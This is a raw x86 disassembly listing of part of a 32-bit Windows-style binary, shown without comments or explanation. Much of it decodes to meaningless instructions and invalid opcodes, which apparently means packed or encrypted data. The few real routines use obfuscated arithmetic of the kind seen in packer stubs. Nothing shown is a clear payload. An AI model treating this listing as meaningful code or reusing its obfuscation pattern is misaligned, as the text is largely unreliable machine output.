  4081ed:	shl    DWORD PTR [edi+ebp*1+0x11],cl
  4081f1:	sub    DWORD PTR [ebx+0x6],eax
  4081f4:	xor    dh,bh
  4081f6:	pop    ebx
  4081f7:	rcl    BYTE PTR [edi],0x94
  4081fa:	icebp  
  4081fb:	or     eax,0x29cfcd8a
  408200:	mov    esi,0x326b89d5
  408205:	sbb    esp,DWORD PTR [edi+0x3ca4e1b8]
  40820b:	adc    DWORD PTR [edi+0x79],0x1a237416
  408212:	jle    0x40826a
  408214:	loope  0x408208
  408216:	(bad)  
  408217:	xlat   BYTE PTR ds:[ebx]
  408218:	jb     0x408215
  40821a:	mov    ebp,0xba280a6f
  40821f:	into   
  408220:	loope  0x4081f5
  408222:	mov    ebx,0xe10527c2
  408227:	in     al,0x5f
  408229:	or     eax,0x6f5481c5
  40822e:	aas    
  40822f:	pusha  
  408230:	(bad)  
  408231:	cmp    DWORD PTR [esi+edi*1-0x4],edi
  408235:	in     eax,dx
  408236:	stc    
  408237:	adc    esi,DWORD PTR [ebx]
  408239:	cmp    BYTE PTR [edi],dl
  40823b:	jge    0x4082b5
  40823d:	pushf  
  40823e:	mov    al,0xbe
  408240:	pop    ebx
  408241:	xor    ebx,eax
  408243:	pop    ebx
  408244:	aas    
  408245:	xor    BYTE PTR [eax+0x68a009ec],0x2b
  40824c:	test   al,0xcf
  40824e:	and    ecx,esi
  408250:	in     eax,0x11
  408252:	or     al,0x5e
  408254:	sub    al,0x33
  408256:	iret   
  408257:	(bad)  
  408258:	mov    ebx,0xd83589f
  40825d:	add    DWORD PTR [edx+eax*1-0x773f211],0x19
  408265:	add    al,0x28
  408267:	push   ds
  408268:	sub    DWORD PTR [esi],esp
  40826a:	add    al,0x1d
  40826c:	js     0x40821c
  40826e:	sub    eax,0x9fbaa0b2
  408273:	lock (bad) fs:[ebx]
  408277:	test   eax,0xdb4cb6ba
  40827c:	fisttp QWORD PTR [edi-0x5ce926b6]
  408282:	in     al,0x36
  408284:	adc    DWORD PTR [ebp+0x3e],ebx
  408287:	retf   0xff6c
  40828a:	or     eax,0x41350e9c
  40828f:	or     DWORD PTR [ecx+0x5407e42c],edx
  408295:	std    
  408296:	adc    al,0x9c
  408298:	xchg   esi,eax
  408299:	xchg   ecx,eax
  40829a:	sahf   
  40829b:	inc    edx
  40829c:	inc    esp
  40829d:	sbb    dh,dh
  40829f:	pop    es
  4082a0:	jbe    0x4082f3
  4082a2:	xchg   ebp,eax
  4082a3:	aam    0xca
  4082a5:	and    DWORD PTR ds:0xcac2447,esp
  4082ab:	test   al,0xa7
  4082ad:	mov    bl,0x33
  4082af:	xor    BYTE PTR [eax],dh
  4082b1:	mov    bl,BYTE PTR [esi+ecx*2]
  4082b4:	test   DWORD PTR [esi+0x2e],esp
  4082b7:	pop    DWORD PTR [edi-0x4a39017]
  4082bd:	clc    
  4082be:	ret    
  4082bf:	and    ecx,DWORD PTR [ebp+0x5ac448b3]
  4082c5:	les    edi,FWORD PTR [esi]
  4082c7:	mov    WORD PTR [ebx-0x6f2fc15a],ss
  4082cd:	mov    al,0x82
  4082cf:	push   ebp
  4082d0:	jg     0x408326
  4082d2:	rcl    DWORD PTR [edx-0x1e],0x9d
  4082d6:	retf   0x9a33
  4082d9:	sub    ebp,DWORD PTR [eax-0x632dccf6]
  4082df:	push   esp
  4082e0:	mov    ds:0xedfba46d,eax
  4082e5:	xchg   bh,dh
  4082e7:	call   0xcf57:0xccae59d3
  4082ee:	dec    ebp
  4082ef:	xor    esi,DWORD PTR ds:0xc9980ad9
  4082f5:	push   edi
  4082f6:	push   ds
  4082f7:	(bad)  
  4082f8:	sbb    ch,ah
  4082fa:	rcl    DWORD PTR [eax],0x88
  4082fd:	ins    DWORD PTR es:[edi],dx
  4082fe:	xor    edx,DWORD PTR [esi+0x56908d9]
  408304:	(bad)  
  408305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408306:	xchg   ebp,eax
  408307:	xor    ch,BYTE PTR [ebp+esi*8-0x39661a6a]
  40830e:	cs add al,0x0
  408311:	les    edx,FWORD PTR [edi]
  408313:	jno    0x4082c5
  408315:	das    
  408316:	cmc    
  408317:	data16 addr16 sti 
  40831a:	jle    0x40833a
  40831c:	xor    eax,0x9b7408c1
  408321:	ins    DWORD PTR es:[edi],dx
  408322:	test   DWORD PTR [edi+0x77],eax
  408325:	clc    
  408326:	scas   al,BYTE PTR es:[edi]
  408327:	sub    eax,0xce8550b5
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	ror    DWORD PTR [esi-0x1b],0x92
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x4084de
  40848a:	aam    0xb1
  40848c:	lahf   
  40848d:	stc    
  40848e:	push   es
  40848f:	xor    BYTE PTR [ebx+0x7d],dh
  408492:	xchg   ebx,eax
  408493:	pop    esi
  408494:	jbe    0x4084f0
  408496:	and    eax,0x66dbff9
  40849b:	mov    WORD PTR [eax-0x52418cbd],gs
  4084a1:	push   esi
  4084a2:	loope  0x40851f
  4084a4:	push   0x11b6aab4
  4084a9:	push   ss
  4084aa:	popa   
  4084ab:	nop
  4084ac:	push   0xffffffec
  4084ae:	jno    0x408445
  4084b0:	fistp  DWORD PTR [edi-0x9]
  4084b3:	cmp    ecx,DWORD PTR [ecx]
  4084b5:	aad    0x5f
  4084b7:	xchg   edx,eax
  4084b8:	ror    DWORD PTR es:[eax+0x48fa676e],0xbc
  4084c0:	inc    edi
  4084c1:	jbe    0x40852a
  4084c3:	inc    esp
  4084c4:	jno    0x408530
  4084c6:	inc    esp
  4084c7:	dec    esp
  4084c8:	mov    al,ds:0xd613fd96
  4084cd:	or     ebp,DWORD PTR [eax]
  4084cf:	mov    edi,DWORD PTR [edi+0x25]
  4084d2:	je     0x40845d
  4084d4:	pop    ss
  4084d5:	add    al,0xf4
  4084d7:	lock cmp DWORD PTR [edi],eax
  4084da:	sbb    al,0x63
  4084dc:	mov    ds:0xef638c2c,eax
  4084e1:	pop    eax
  4084e2:	inc    esi
  4084e3:	mov    bh,0x22
  4084e5:	pop    es
  4084e6:	dec    esp
  4084e7:	xor    BYTE PTR [edx+0x5a],bl
  4084ea:	cli    
  4084eb:	loop   0x408484
  4084ed:	fist   WORD PTR [ecx-0x13f27395]
  4084f3:	mov    esi,0xe96b702c
  4084f8:	outs   dx,BYTE PTR ds:[esi]
  4084f9:	xchg   edi,eax
  4084fa:	in     eax,dx
  4084fb:	inc    esi
  4084fc:	lods   al,BYTE PTR ds:[esi]
  4084fd:	retf   
  4084fe:	inc    esp
  4084ff:	aaa    
  408500:	and    DWORD PTR [ebx],0xd6a0b6ad
  408506:	ss push ds
  408508:	loope  0x4084ee
  40850a:	icebp  
  40850b:	mov    edi,0xef5df9ae
  408510:	aad    0x26
  408512:	jecxz  0x4084f1
  408514:	mov    ah,0xe0
  408516:	in     al,0xc0
  408518:	jae    0x408593
  40851a:	das    
  40851b:	into   
  40851c:	jno    0x4084f7
  40851e:	data16 stos BYTE PTR es:[edi],al
  408520:	mov    WORD PTR [ebx+0x5b88fd39],ss
  408526:	pop    ds
  408527:	daa    
  408528:	or     edx,DWORD PTR [ebx-0x11]
  40852b:	rcl    BYTE PTR [esi+0x7f7babac],1
  408531:	add    bl,BYTE PTR [ebp+0xe]
  408534:	fidiv  WORD PTR [edx-0x4a]
  408537:	dec    edx
  408538:	gs int 0xbe
  40853b:	mov    esi,0xdb131c45
  408540:	leave  
  408541:	(bad)  
  408542:	jge    0x4085a2
  408544:	aas    
  408545:	test   DWORD PTR [ecx+eax*1+0x43],eax
  408549:	adc    esi,DWORD PTR [ebp+0x4]
  40854c:	stos   BYTE PTR es:[edi],al
  40854d:	sub    eax,0x38fe9cf4
  408552:	(bad)
  408555:	push   ss
  408556:	aaa    
  408557:	sbb    ch,BYTE PTR [ebp+0x4e12edd4]
  40855d:	in     al,0xd7
  40855f:	mov    ebx,0x4c03a71
  408564:	(bad)  
  408566:	ret    
  408567:	dec    ebx
  408568:	jae    0x40857f
  40856a:	ror    edi,cl
  40856c:	jle    0x40850b
  40856e:	or     ebp,ebp
  408570:	mov    ds,WORD PTR [ebx]
  408572:	test   BYTE PTR [ecx],bh
  408574:	adc    esi,DWORD PTR [ecx+0x42]
  408577:	icebp  
  408578:	add    esp,DWORD PTR [esi-0x14]
  40857b:	sub    al,0x70
  40857d:	mov    al,0x8f
  40857f:	fisubr WORD PTR [ebp+0x4]
  408582:	mov    ebp,0xfaa77a9d
  408587:	or     BYTE PTR [edi+0x3c],al
  40858a:	mov    ch,0xc1
  40858d:	adc    esi,ecx
  40858f:	or     BYTE PTR [eax],cl
  408591:	mov    dl,0xe8
  408593:	stc    
  408594:	cmp    esp,edx
  408596:	cwde   
  408597:	icebp  
  408598:	add    BYTE PTR [ebp-0x6e],al
  40859b:	sub    DWORD PTR [ecx+0x10],esi
  40859e:	or     esp,ecx
  4085a0:	jns    0x40859d
  4085a2:	cmc    
  4085a3:	lahf   
  4085a4:	jle    0x4085f3
  4085a6:	dec    ebx
  4085a7:	mov    fs,edx
  4085a9:	in     eax,dx
  4085aa:	test   al,0xcd
  4085ac:	fs out dx,eax
  4085ae:	push   edi
  4085af:	cmp    al,0xbb
  4085b1:	cmp    dh,BYTE PTR [edx+0x469e1a81]
  4085b7:	xor    eax,0xe0f43f41
  4085bc:	aam    0x73
  4085be:	jmp    0xd57c6b4
  4085c3:	add    DWORD PTR [ebx-0x2e],0xe510740e
  4085ca:	pusha  
  4085cb:	ss (bad) 
  4085cd:	jmp    0xba5b6923
  4085d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085d4:	pop    ecx
  4085d5:	fcmovne st,st(5)
  4085d7:	dec    edi
  4085d8:	push   edi
  4085d9:	xchg   esp,eax
  4085da:	push   ss
  4085db:	ror    DWORD PTR ss:[edi],0x2a
  4085df:	inc    esp
  4085e0:	push   cs
  4085e1:	jnp    0x40857f
  4085e3:	sub    eax,0x4013f9bb
  4085e8:	xchg   DWORD PTR [ecx],edi
  4085ea:	sbb    BYTE PTR ds:0x40cc6aa3,bl
  4085f0:	fwait
  4085f1:	rcl    cl,1
  4085f3:	fadd   QWORD PTR [ebp+0x4d0d3a16]
  4085f9:	adc    ebp,ebx
  4085fb:	dec    edx
  4085fc:	out    0xad,al
  4085fe:	pop    es
  4085ff:	(bad)  
  408600:	mov    ah,0x87
  408602:	inc    ebp
  408603:	lock ret 
  408605:	mov    al,0xb5
  408607:	pop    ecx
  408608:	out    0x77,al
  40860a:	inc    edi
  40860b:	nop
  40860c:	fisubr DWORD PTR [ebp-0xc474e24]
  408612:	stos   DWORD PTR es:[edi],eax
  408613:	(bad)  
  408614:	jmp    0x4085ee
  408616:	jns    0x4085c3
  408618:	stos   BYTE PTR es:[edi],al
  408619:	add    DWORD PTR [ebp+ebp*2+0x445ce8dd],esp
  408620:	sub    eax,0x46804d3d
  408625:	and    ebp,DWORD PTR [ecx-0x7ed1de07]
  40862b:	fwait
  40862c:	ret    
  40862d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862e:	jmp    DWORD PTR [ebp-0x7530276e]
  408634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408635:	mov    dh,0x26
  408637:	aas    
  408638:	loopne 0x40863c
  40863a:	xchg   edi,eax
  40863b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40863c:	pop    edi
  40863d:	pop    esi
  40863e:	pop    ds
  40863f:	adc    edx,ebx
  408641:	rcr    DWORD PTR [esi-0x171abbf],1
  408647:	test   DWORD PTR [edx-0x551e026a],ebp
  40864d:	ret    0xc7ad
  408650:	jo     0x408601
  408652:	icebp  
  408653:	stc    
  408654:	mov    edi,edi
  408656:	cmp    BYTE PTR [edx],dh
  408658:	outs   dx,DWORD PTR ds:[esi]
  408659:	lods   al,BYTE PTR ds:[esi]
  40865a:	rol    BYTE PTR [ecx],0xe3
  40865d:	pop    ds
  40865e:	cmp    edi,DWORD PTR [edx+0x47]
  408661:	inc    edi
  408662:	pop    eax
  408663:	out    dx,eax
  408664:	mov    al,0xc2
  408666:	jl     0x408699
  408668:	ds mov bh,0x58
  40866b:	lahf   
  40866c:	and    bh,ch
  40866e:	cmp    bl,BYTE PTR [ebx]
  408670:	and    ch,BYTE PTR [eax+eiz*4]
  408673:	lahf   
  408674:	fcmovbe st,st(3)
  408676:	push   ds
  408677:	push   esp
  408678:	ins    BYTE PTR es:[edi],dx
  408679:	cmp    eax,edi
  40867b:	aaa    
  40867c:	daa    
  40867d:	rcl    bh,1
  40867f:	leave  
  408680:	(bad)  
  408681:	and    al,0xa5
  408683:	adc    ebx,DWORD PTR [edi+eax*1+0x7f35ea44]
  40868a:	stos   DWORD PTR es:[edi],eax
  40868b:	adc    BYTE PTR [eax],cl
  40868d:	bound  esi,QWORD PTR [ebx]
  40868f:	xor    eax,ebx
  408691:	call   0x58b799bd
  408696:	test   eax,0xd07e1c59
  40869b:	int3   
  40869c:	mov    ebp,0xf8147370
  4086a1:	ret    0x1f9c
  4086a4:	icebp  
  4086a5:	add    al,BYTE PTR [ecx-0x4ee6a312]
  4086ab:	loopne 0x408693
  4086ad:	lock mov ds:0xf71a57b4,eax
  4086b3:	jbe    0x4086f8
  4086b5:	out    0xf,al
  4086b7:	mov    BYTE PTR [ebp-0x1e26c55d],0x4
  4086be:	ror    DWORD PTR [ebp+0x16],cl
  4086c1:	pushf  
  4086c2:	dec    ebp
  4086c3:	and    al,0xc4
  4086c5:	int    0xfe
  4086c7:	cli    
  4086c8:	call   0x9b6c:0x4037301e
  4086cf:	jge    0x408670
  4086d1:	stc    
  4086d2:	pop    esp
  4086d3:	into   
  4086d4:	es stos BYTE PTR es:[edi],al
  4086d6:	jge    0x408740
  4086d8:	in     eax,0x10
  4086da:	mov    edx,0xb19eed0c
  4086df:	mov    esi,0xcd4e93ba
  4086e4:	push   esi
  4086e5:	mov    ah,0x1e
  4086e7:	out    dx,eax
  4086e8:	push   0x9f62b883
  4086ed:	mov    dh,0x12
  4086ef:	mov    dl,0xd7
  4086f1:	jle    0x40867a
  4086f3:	pop    ebx
  4086f4:	xor    BYTE PTR [ecx+0x4f],al
  4086f7:	inc    ecx
  4086f8:	popf   
  4086f9:	cld    
  4086fa:	pop    es
  4086fb:	pop    edi
  4086fc:	pop    ecx
  4086fd:	mov    ah,0xec
  4086ff:	dec    eax
  408700:	push   es
  408701:	and    ecx,DWORD PTR [edi+0x15]
  408704:	jne    0x408779
  408706:	fldenv [esi]
  408708:	data16 rol BYTE PTR [ecx-0x3],1
  40870c:	iret   
  40870d:	mov    WORD PTR [eax+0x71cfe89a],ds
  408713:	scas   al,BYTE PTR es:[edi]
  408714:	sbb    edi,DWORD PTR [edx-0x31bd8fe8]
  40871a:	retf   
  40871b:	xchg   ebx,eax
  40871c:	push   edx
  40871d:	enter  0xc90e,0x9f
  408721:	sbb    al,bh
  408723:	mov    esp,0x2c7d0f73
  408728:	cli    
  408729:	push   ss
  40872a:	mov    edi,0xf913fe47
  40872f:	push   edx
  408730:	pop    esp
  408731:	(bad)  
  408732:	jl     0x408727
  408734:	sahf   
  408735:	dec    edx
  408736:	push   es
  408737:	and    eax,0x2698545d
  40873c:	xor    eax,0xddccb9f4
  408741:	mov    esi,0x2f7e8429
  408746:	stc    
  408747:	fiadd  DWORD PTR [edi-0x79]
  40874a:	xlat   BYTE PTR ds:[ebx]
  40874b:	retf   0x40f
  40874e:	in     al,dx
  40874f:	in     eax,dx
  408750:	pop    ecx
  408751:	icebp  
  408752:	fsubr  DWORD PTR [edi-0x5]
  408755:	inc    edx
  408756:	pop    ecx
  408757:	aas    
  408758:	push   0x3eb68b40
  40875d:	leave  
  40875e:	ja     0x408768
  408760:	lock dec ebp
  408762:	mov    eax,ds:0xba2dff19
  408767:	xchg   BYTE PTR gs:[ebp-0x462dcc6f],al
  40876e:	lods   eax,DWORD PTR ds:[esi]
  40876f:	cld    
  408770:	fs jb  0x40876a
  408773:	icebp  
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  ecx,QWORD PTR [ecx]
  40878b:	xor    al,0x6
  40878d:	or     eax,DWORD PTR [ebx-0x21]
  408790:	jle    0x408810
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x4087ef
  408797:	call   0xdc4f:0x186b4966
  40879e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879f:	neg    DWORD PTR [edi+0x5615cee6]
  4087a5:	mov    al,0xca
  4087a7:	mov    cl,al
  4087a9:	jg     0x408754
  4087ab:	retf   0xa5fc
  4087ae:	mov    dh,0xa5
  4087b0:	push   es
  4087b1:	arpl   sp,ax
  4087b3:	jb     0x4087dd
  4087b5:	mov    dh,0x35
  4087b7:	cld    
  4087b8:	pusha  
  4087b9:	xlat   BYTE PTR ds:[ebx]
  4087ba:	add    eax,0x38e5998a
  4087bf:	adc    edx,DWORD PTR [ebp+0x70]
  4087c2:	jne    0x4087aa
  4087c4:	pop    edx
  4087c5:	scas   al,BYTE PTR es:[edi]
  4087c6:	pop    eax
  4087c7:	ret    
  4087c8:	add    edi,DWORD PTR [ebx+ecx*2+0x78a68701]
  4087cf:	xor    al,0x46
  4087d1:	cmp    BYTE PTR [eax],al
  4087d3:	rcl    DWORD PTR [esi],0x17
  4087d6:	(bad)
  4087d9:	mov    eax,0x2c1fce5a
  4087de:	aas    
  4087df:	pop    ds
  4087e0:	(bad)  [ebp-0x3a]
  4087e3:	loope  0x4087a2
  4087e5:	and    al,0x47
  4087e7:	cmc    
  4087e8:	stos   BYTE PTR es:[edi],al
  4087e9:	ficomp DWORD PTR [ebp-0xc727403]
  4087ef:	ds (bad) 
  4087f1:	xor    bl,BYTE PTR ds:0x8a076773
  4087f7:	ficom  WORD PTR [ecx-0x28]
  4087fa:	jmp    0x1c44:0x175ca77f
  408801:	fstp   st(1)
  408803:	cmp    esp,esp
  408805:	pusha  
  408806:	mov    esi,DWORD PTR [ecx-0x4160b024]
  40880c:	jp     0x4087be
  40880e:	call   0x8993a50e
  408813:	dec    ecx
  408814:	push   0x28
  408816:	cmp    ecx,DWORD PTR [edi+0x3b19dcab]
  40881c:	jle    0x408813
  40881e:	inc    ebx
  40881f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408820:	inc    eax
  408821:	imul   ecx,DWORD PTR [ebp+eiz*8+0x2f9b315a],0x7f3a022b
  40882c:	stos   BYTE PTR es:[edi],al
  40882d:	xchg   ebp,eax
  40882e:	les    ebx,FWORD PTR [esp+eax*4+0x33]
  408832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408833:	or     DWORD PTR [esi-0x7fabcba2],0x4d83e67a
  40883d:	fimul  DWORD PTR [ebp-0x7bdeb31]
  408843:	mov    ds:0xf579090d,al
  408848:	add    BYTE PTR [edi-0x14b43de5],bh
  40884e:	sub    DWORD PTR [edi],esi
  408850:	cwde   
  408851:	in     eax,dx
  408852:	cs ja  0x4088af
  408855:	(bad)  
  408856:	bound  eax,QWORD PTR [eax-0x35f28688]
  40885c:	mov    bh,al
  40885e:	sub    edi,DWORD PTR [esi-0x19]
  408861:	je     0x4088c7
  408863:	icebp  
  408864:	into   
  408865:	jle    0x4087ed
  408867:	mov    ebp,DWORD PTR es:[edx]
  40886a:	and    DWORD PTR [esi+0x45dbfff5],esp
  408870:	xchg   edi,eax
  408871:	dec    edx
  408872:	cwde   
  408873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408874:	cwde   
  408875:	mov    eax,0x9c7efebe
  40887a:	adc    al,0x64
  40887c:	push   cs
  40887d:	iret   
  40887e:	add    cl,BYTE PTR [edx-0x20]
  408881:	ret    0xc6df
  408884:	adc    BYTE PTR [eax+esi*8+0x428216e6],ch
  40888b:	xchg   esi,eax
  40888c:	sub    al,0xba
  40888e:	popf   
  40888f:	mov    dl,0x6f
  408891:	xor    ebx,DWORD PTR [esi-0x7d]
  408894:	pop    esi
  408895:	and    ebp,DWORD PTR [esi-0x708b92f]
  40889b:	mov    dh,BYTE PTR [eax+0x6]
  40889e:	push   esi
  40889f:	mov    dh,0xa
  4088a1:	and    BYTE PTR [ebp-0x7d],ch
  4088a4:	fld    st(6)
  4088a6:	mov    dl,0x23
  4088a8:	(bad)  
  4088a9:	scas   eax,DWORD PTR es:[edi]
  4088aa:	or     edi,DWORD PTR [esi]
  4088ac:	dec    esp
  4088ad:	jo     0x40891c
  4088af:	xor    cl,BYTE PTR [ebp+0x355620c3]
  4088b5:	push   es
  4088b6:	dec    ebx
  4088b7:	push   ebx
  4088b8:	xor    esp,ebp
  4088ba:	pop    ebx
  4088bb:	mov    edx,0x13f7dfee
  4088c0:	pop    esp
  4088c1:	into   
  4088c2:	dec    edx
  4088c3:	ror    DWORD PTR [edx],cl
  4088c5:	xor    DWORD PTR [edx],esp
  4088c7:	inc    ebx
  4088c8:	arpl   WORD PTR [ebp-0x7b],bp
  4088cb:	jle    0x40890c
  4088cd:	ins    DWORD PTR es:[edi],dx
  4088ce:	cli    
  4088cf:	inc    ecx
  4088d0:	into   
  4088d1:	mov    cl,0xf9
  4088d3:	xchg   esp,eax
  4088d4:	inc    ebp
  4088d5:	xor    eax,0xffed4886
  4088da:	or     eax,0xe
  4088dd:	jge    0x40892a
  4088df:	stos   DWORD PTR es:[di],eax
  4088e1:	call   0x1f58:0x27d506c
  4088e8:	add    ch,bh
  4088ea:	or     ch,BYTE PTR [ebp+0x6fb3589f]
  4088f0:	jbe    0x40890b
  4088f2:	lods   al,BYTE PTR ds:[esi]
  4088f3:	jmp    0x1171:0x18c9029
  4088fa:	and    ebx,eax
  4088fc:	mov    ch,0xc0
  4088fe:	ja     0x4088aa
  408900:	(bad)  
  408901:	into   
  408902:	fsubp  st(2),st
  408904:	inc    ebx
  408905:	je     0x408982
  408907:	(bad)  [esi-0x1d97ac48]
  40890d:	push   cs
  40890e:	loopne 0x4088d1
  408910:	dec    edx
  408911:	xchg   ebp,ecx
  408913:	xchg   ecx,eax
  408914:	sub    al,0x26
  408916:	mov    ecx,0xe513e6f2
  40891b:	mov    ecx,0xf8dcb0d4
  408920:	inc    ebx
  408921:	fwait
  408922:	shr    DWORD PTR ds:0x4653e535,1
  408928:	enter  0x740d,0x1f
  40892c:	cdq    
  40892d:	jnp    0x408950
  40892f:	sbb    eax,0xebff14f4
  408934:	sub    BYTE PTR [eax+0x487644a9],dl
  40893a:	cmp    al,0x87
  40893c:	scas   eax,DWORD PTR es:[edi]
  40893d:	dec    edi
  40893e:	fwait
  40893f:	stos   BYTE PTR es:[edi],al
  408940:	mov    ecx,edi
  408942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408943:	push   esp
  408944:	rol    DWORD PTR [eax-0x2c],1
  408947:	xor    DWORD PTR [eax+0x1db71a4d],ebp
  40894d:	loop   0x408950
  40894f:	ficom  WORD PTR [eax+eiz*8+0xf]
  408953:	push   0xffffffa8
  408955:	sub    bl,BYTE PTR [esp+eax*4]
  408958:	jns    0x40894c
  40895a:	cwde   
  40895b:	call   FWORD PTR [eax]
  40895d:	mov    WORD PTR [edi],ss
  40895f:	(bad)  
  408960:	out    0x6a,al
  408962:	ss iret 
  408964:	push   cs
  408965:	mov    esi,0x200f394
  40896a:	inc    edi
  40896b:	and    al,0x9b
  40896d:	fidivr WORD PTR [ecx-0x23f9daf7]
  408973:	pusha  
  408974:	hlt    
  408975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408976:	and    eax,0xe957ac32
  40897b:	mov    eax,0x8221959e
  408980:	in     al,dx
  408981:	mov    al,ds:0x4b6fd90f
  408986:	repnz mov al,ds:0x8b999f
  40898c:	sub    BYTE PTR [edi+0x2e],bh
  40898f:	pop    esi
  408990:	xor    al,0x6
  408992:	jne    0x4089e3
  408994:	xor    ecx,DWORD PTR [esp+esi*8-0x28f9e3a]
  40899b:	lods   al,BYTE PTR ds:[esi]
  40899c:	sbb    eax,0x456c5074
  4089a1:	js     0x408991
  4089a3:	dec    eax
  4089a4:	fst    QWORD PTR [esi-0x284aea98]
  4089aa:	push   edx
  4089ab:	dec    esi
  4089ac:	and    BYTE PTR [ebx],dh
  4089ae:	mov    ch,0xb8
  4089b0:	dec    ebx
  4089b1:	adc    bl,ah
  4089b3:	mov    al,0x6
  4089b5:	fst    DWORD PTR [ecx]
  4089b7:	or     DWORD PTR [esi],0x95be88dc
  4089bd:	jl     0x40894d
  4089bf:	cmp    al,0xbd
  4089c1:	out    dx,al
  4089c2:	stc    
  4089c3:	or     eax,0xca18b2fe
  4089c8:	dec    eax
  4089c9:	test   DWORD PTR [ebp+0x3b51c74f],edi
  4089cf:	sbb    BYTE PTR [ebp+0x799e434c],al
  4089d5:	in     eax,dx
  4089d6:	popf   
  4089d7:	mov    bl,0x76
  4089d9:	rcl    DWORD PTR [ecx+0x72aac600],cl
  4089df:	sub    al,0xb7
  4089e1:	pop    edx
  4089e2:	loop   0x408a1c
  4089e4:	xlat   BYTE PTR ds:[ebx]
  4089e5:	xchg   edx,eax
  4089e6:	ss inc eax
  4089e8:	out    dx,eax
  4089e9:	jmp    0x408a33
  4089eb:	rcr    bl,1
  4089ed:	push   ecx
  4089ee:	pop    ebp
  4089ef:	jmp    0x4089b7
  4089f1:	dec    esp
  4089f2:	addr16 jl 0x408a0a
  4089f5:	sub    DWORD PTR [edi-0x61],eax
  4089f8:	std    
  4089f9:	int3   
  4089fa:	pop    ebx
  4089fb:	mov    ebp,DWORD PTR [esi-0x4f716206]
  408a01:	leave  
  408a02:	pop    ebx
  408a03:	pop    esp
  408a04:	cmp    eax,0x65598dea
  408a09:	inc    ebp
